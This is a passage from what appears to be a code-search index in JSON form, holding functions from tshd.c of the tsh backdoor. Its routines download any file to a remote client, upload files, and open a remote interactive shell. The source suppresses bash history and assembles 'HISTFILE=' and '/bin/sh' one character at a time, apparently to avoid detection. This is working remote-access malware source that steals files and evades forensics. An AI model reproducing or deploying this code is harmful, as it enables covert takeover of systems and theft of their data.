pel_send_msg( client, message, len );\n\n                if( ret != PEL_SUCCESS )\n                {\n                    return( 53 );\n                }\n            }\n        }\n\n        return( 54 );\n    }\n\n    /* not reached */\n\n    return( 55 );\n}","filepath":"tshd.c","line_number":55,"entry_url":"https://github.com/orangetw/tsh.git","slot_name":"8680eb2"},"4294993636":{"score":0.8691763,"function_name":"tshd_get_file","code":"int tshd_get_file( int client )\n{\n    int ret, len, fd;\n\n    /* get the filename */\n\n    ret = pel_recv_msg( client, message, \u0026len );\n\n    if( ret != PEL_SUCCESS )\n    {\n        return( 14 );\n    }\n\n    message[len] = '\\0';\n\n    /* open local file */\n\n    fd = open( (char *) message, O_RDONLY );\n\n    if( fd \u003c 0 )\n    {\n        return( 15 );\n    }\n\n    /* send the data */\n\n    while( 1 )\n    {\n        len = read( fd, message, BUFSIZE );\n\n        if( len == 0 ) break;\n\n        if( len \u003c 0 )\n        {\n            return( 16 );\n        }\n\n        ret = pel_send_msg( client, message, len );\n\n        if( ret != PEL_SUCCESS )\n        {\n            return( 17 );\n        }\n    }\n\n    return( 18 );\n}","filepath":"tshd.c","line_number":300,"entry_url":"https://github.com/orangetw/tsh.git","slot_name":"8680eb2"},"4294993832":{"score":0.88126546,"function_name":"tshd_put_file","code":"int tshd_put_file( int client )\n{\n    int ret, len, fd;\n\n    /* get the filename */\n\n    ret = pel_recv_msg( client, message, \u0026len );\n\n    if( ret != PEL_SUCCESS )\n    {\n        return( 19 );\n    }\n\n    message[len] = '\\0';\n\n    /* create local file */\n\n    fd = creat( (char *) message, 0644 );\n\n    if( fd \u003c 0 )\n    {\n        return( 20 );\n    }\n\n    /* fetch the data */\n\n    while( 1 )\n    {\n        ret = pel_recv_msg( client, message, \u0026len );\n\n        if( ret != PEL_SUCCESS )\n        {\n            if( pel_errno == PEL_CONN_CLOSED )\n            {\n                break;\n            }\n\n            return( 21 );\n        }\n\n        if( write( fd, message, len ) != len )\n        {\n            return( 22 );\n        }\n    }\n\n    return( 23 );\n}","filepath":"tshd.c","line_number":348,"entry_url":"https://github.com/orangetw/tsh.git","slot_name":"8680eb2"},"4294994044":{"score":0.8259553,"function_name":"tshd_runshell","code":"int tshd_runshell( int client )\n{\n    fd_set rd;\n    struct winsize ws;\n    char *slave, *temp, *shell;\n    int ret, len, pid, pty, tty, n;\n\n    /* request a pseudo-terminal */\n\n#if defined LINUX || defined FREEBSD || defined OPENBSD || defined OSF\n\n    if( openpty( \u0026pty, \u0026tty, NULL, NULL, NULL ) \u003c 0 )\n    {\n        return( 24 );\n    }\n\n    slave = ttyname( tty );\n\n    if( slave == NULL )\n    {\n        return( 25 );\n    }\n\n#else\n#if defined IRIX\n\n    slave = _getpty( \u0026pty, O_RDWR, 0622, 0 );\n\n    if( slave == NULL )\n    {\n        return( 26 );\n    }\n\n    tty = open( slave, O_RDWR | O_NOCTTY );\n\n    if( tty \u003c 0 )\n    {\n        return( 27 );\n    }\n\n#else\n#if defined CYGWIN || defined SUNOS || defined HPUX\n\n    pty = open( \"/dev/ptmx\", O_RDWR | O_NOCTTY );\n\n    if( pty \u003c 0 )\n    {\n        return( 28 );\n    }\n\n    if( grantpt( pty ) \u003c 0 )\n    {\n        return( 29 );\n    }\n\n    if( unlockpt( pty ) \u003c 0 )\n    {\n        return( 30 );\n    }\n\n    slave = ptsname( pty );\n\n    if( slave == NULL )\n    {\n        return( 31 );\n    }\n\n    tty = open( slave, O_RDWR | O_NOCTTY );\n\n    if( tty \u003c 0 )\n    {\n        return( 32 );\n    }\n\n#if defined SUNOS || defined HPUX\n\n    if( ioctl( tty, I_PUSH, \"ptem\" ) \u003c 0 )\n    {\n        return( 33 );\n    }\n\n    if( ioctl( tty, I_PUSH, \"ldterm\" ) \u003c 0 )\n    {\n        return( 34 );\n    }\n\n#if defined SUNOS\n\n    if( ioctl( tty, I_PUSH, \"ttcompat\" ) \u003c 0 )\n    {\n        return( 35 );\n    }\n\n#endif\n#endif\n#endif\n#endif\n#endif\n\n    /* just in case bash is run, kill the history file */\n\n    temp = (char *) malloc( 10 );\n\n    if( temp == NULL )\n    {\n        return( 36 );\n    }\n\n    temp[0] = 'H'; temp[5] = 'I';\n    temp[1] = 'I'; temp[6] = 'L';\n    temp[2] = 'S'; temp[7] = 'E';\n    temp[3] = 'T'; temp[8] = '=';\n    temp[4] = 'F'; temp[9] = '\\0';\n\n    putenv( temp );\n\n    /* get the TERM environment variable */\n\n    ret = pel_recv_msg( client, message, \u0026len );\n\n    if( ret != PEL_SUCCESS )\n    {\n        return( 37 );\n    }\n\n    message[len] = '\\0';\n\n    temp = (char *) malloc( len + 6 );\n\n    if( temp == NULL )\n    {\n        return( 38 );\n    }\n\n    temp[0] = 'T'; temp[3] = 'M';\n    temp[1] = 'E'; temp[4] = '=';\n    temp[2] = 'R';\n\n    strncpy( temp + 5, (char *) message, len + 1 );\n\n    putenv( temp );\n\n    /* get the window size */\n\n    ret = pel_recv_msg( client, message, \u0026len );\n\n    if( ret != PEL_SUCCESS || len != 4 )\n    {\n        return( 39 );\n    }\n\n    ws.ws_row = ( (int) message[0] \u003c\u003c 8 ) + (int) message[1];\n    ws.ws_col = ( (int) message[2] \u003c\u003c 8 ) + (int) message[3];\n\n    ws.ws_xpixel = 0;\n    ws.ws_ypixel = 0;\n\n    if( ioctl( pty, TIOCSWINSZ, \u0026ws ) \u003c 0 )\n    {\n        return( 40 );\n    }\n\n    /* get the system command */\n\n    ret = pel_recv_msg( client, message, \u0026len );\n\n    if( ret != PEL_SUCCESS )\n    {\n        return( 41 );\n    }\n\n    message[len] = '\\0';\n\n    temp = (char *) malloc( len + 1 );\n\n    if( temp == NULL )\n    {\n        return( 42 );\n    }\n\n    strncpy( temp, (char *) message, len + 1 );\n\n    /* fork to spawn a shell */\n\n    pid = fork();\n\n    if( pid \u003c 0 )\n    {\n        return( 43 );\n    }\n\n    if( pid == 0 )\n    {\n        /* close the client socket and the pty (master side) */\n\n        close( client );\n        close( pty );\n\n        /* create a new session */\n\n        if( setsid() \u003c 0 )\n        {\n            return( 44 );\n        }\n\n        /* set controlling tty, to have job control */\n\n#if defined LINUX || defined FREEBSD || defined OPENBSD || defined OSF\n\n        if( ioctl( tty, TIOCSCTTY, NULL ) \u003c 0 )\n        {\n            return( 45 );\n        }\n\n#else\n#if defined CYGWIN || defined SUNOS || defined IRIX || defined HPUX\n\n        {\n            int fd;\n\n            fd = open( slave, O_RDWR );\n\n            if( fd \u003c 0 )\n            {\n                return( 46 );\n            }\n\n            close( tty );\n\n            tty = fd;\n        }\n\n#endif\n#endif\n\n        /* tty becomes stdin, stdout, stderr */\n\n        dup2( tty, 0 );\n        dup2( tty, 1 );\n        dup2( tty, 2 );\n\n        if( tty \u003e 2 )\n        {\n            close( tty );\n        }\n\n        /* fire up the shell */\n\n        shell = (char *) malloc( 8 );\n\n        if( shell == NULL )\n        {\n            return( 47 );\n        }\n\n        shell[0] = '/'; shell[4] = '/';\n        shell[1] = 'b'; shell[5] = 's';\n        shell[2] = 'i'; shell[6] = 'h';\n        shell[3] = 'n'; shell[7] = '\\0';\n\n        execl( shell, shell + 5, \"-c\", temp, (char *) 0 );\n\n        /* d0h, this shouldn't happen */\n\n        return( 48 );\n    }\n    else\n    {\n        /* tty (slave side) not needed anymore */\n\n        close( tty );\n\n        /* let's forward the data back and forth */\n\n        while( 1 )\n        {\n            FD_ZERO( \u0026rd );\n            FD_SET( client, \u0026rd );\n            FD_SET( pty, \u0026rd );\n\n            n = ( pty \u003e client ) ? pty : client;\n\n            if( select( n + 1, \u0026rd, NULL, NULL, NULL ) \u003c 0 )\n            {\n                return( 49 );\n            }\n\n            if( FD_ISSET( client, \u0026rd ) )\n            {\n                ret = pel_recv_msg( client, message, \u0026len );\n\n                if( ret != PEL_SUCCESS )\n                {\n                    return( 50 );\n                }\n\n                if( write( pty, message, len ) != len )\n                {\n                    return( 51 );\n                }\n            }\n\n            if( FD_ISSET( pty, \u0026rd ) )\n            {\n                len = read( pty, message, BUFSIZE );\n\n                if( len == 0 ) break;\n\n                if( len \u003c 0 )\n                {\n                    return( 52 );\n                }\n\n                ret = pel_send_msg( client, message, len );\n\n                if( ret != PEL_SUCCESS )\n                {\n                    return( 53 );\n                }\n            }\n        }\n\n        return( 54 );\n    }\n\n    /* not reached */\n\n    return( 55 );\n}","filepath":"tshd.c","line_number":397,"entry_url":"https://github.com/orangetw/tsh.git","slot_name":"8680eb2"}}}